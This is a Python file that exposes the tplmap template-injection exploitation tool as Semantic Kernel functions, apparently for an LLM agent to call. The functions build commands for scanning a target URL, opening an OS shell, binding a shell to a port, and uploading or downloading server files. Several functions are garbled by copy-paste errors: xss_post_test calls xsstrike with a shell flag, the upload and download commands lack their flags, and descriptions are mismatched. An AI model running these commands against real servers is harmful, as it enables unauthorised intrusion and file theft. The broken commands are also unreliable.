from semantic_kernel.skill_definition import (sk_function,
                                              sk_function_context_parameter)
from semantic_kernel.orchestration.sk_context import SKContext

'''
    Tplmap is able to detect and exploit SSTI in a range of template engines to get access 
    to the underlying file system and operating system. Run it against the URL 
    to test if the parameters are vulnerable.
    --os-shell                Run shell on the target
    --os-cmd                  Execute shell commands
    --bind-shell PORT         Connect to a shell bind to a target port
    --reverse-shell HOST PORT Send a shell back to the attacker's port
    --upload LOCAL REMOTE     Upload files to the server
    --download REMOTE LOCAL   Download remote files
'''
class Tqlmap:
    # Function1: 扫描可能存在的漏洞与网站架构
    @sk_function(
        description=
        "Automatic Server-Side Template Injection Detection using default option",
        name="tplmap_scan_default",
    )
    @sk_function_context_parameter(
        description="target url address",
        name="target",
    )
    def tplmap_scan(self, context: SKContext) -> str:
        print_str = f"tplmap -u {context['target']}"
        return print_str

    # Function2: 利用之前扫描结果获得的SSTI漏洞,获取远程shell
    @sk_function(
        description=
        "Run shell on the target , only can be used when the former tplmap scan result of this capability is available",
        name="xss_post_test",
    )
    @sk_function_context_parameter(
        description="target url address",
        name="target",
    )
    def xss_post_test(self, context: SKContext) -> str:
        print_str = f"xsstrike -u {context['target']} --os-shell"
        return print_str

    # Function3:利用之前扫描结果获得的SSTI漏洞,获取远程shell并连接到指定端口
    @sk_function(
        description=
        "Connect to a shell bind to a target port, only can be used when the former tplmap scan result of this capability is available",
        name="tplmap_shell_port",
    )
    @sk_function_context_parameter(
        description="target url address ",
        name="target",
    )
    @sk_function_context_parameter(
        description="target connection port ",
        name="port",
    )
    def tplmap_shell_port(self, context: SKContext) -> str:
        print_str = f"tplmap -u {context['target']} --bind-shell {context['port']}"
        return print_str

    #   Function4: 利用之前扫描结果获得的SSTI漏洞,实现上传本地文件上传到url所在的服务器
    @sk_function(
        description=
        "Upload files to the server ,only can be used when the former tplmap scan result of this capability is available.",
        name="tplmap_file_upload",
    )
    @sk_function_context_parameter(
        description="target  url address",
        name="target",
    )
    @sk_function_context_parameter(
        description="the path of the upload file",
        name="localpath",
    )
    @sk_function_context_parameter(
        description="上传文件在server的保存路径",
        name="serverpath",
    )
    def tplmap_file_upload(self,context: SKContext) -> str:
        print_str = f"tplmap -u {context['target']} {context['localpath']} {context['serverpath']}"
        return print_str

    # Function5:利用之前扫描结果获得的SSTI漏洞,实现从url所在服务器文件下载到本地
    @sk_function(
        description=
        " The fuzzer is meant to test filters and Web Application Firewalls. It is painfully slow because it sends randomly* delay requests and the delay can be up to 30 seconds. ",
        name="tplmap_file_download",
    )
    @sk_function_context_parameter(
        description="target url address",
        name="target",
    )
    @sk_function_context_parameter(
        description="the path of the download file",
        name="localpath",
    )
    @sk_function_context_parameter(
        description="上传文件在server的保存路径",
        name="serverpath",
    )
    def xss_fuzzing_test(self, context: SKContext) -> str:
        print_str = f"tplmap -u {context['target']} {context['serverpath']} {context['localpath']}"
        return print_str

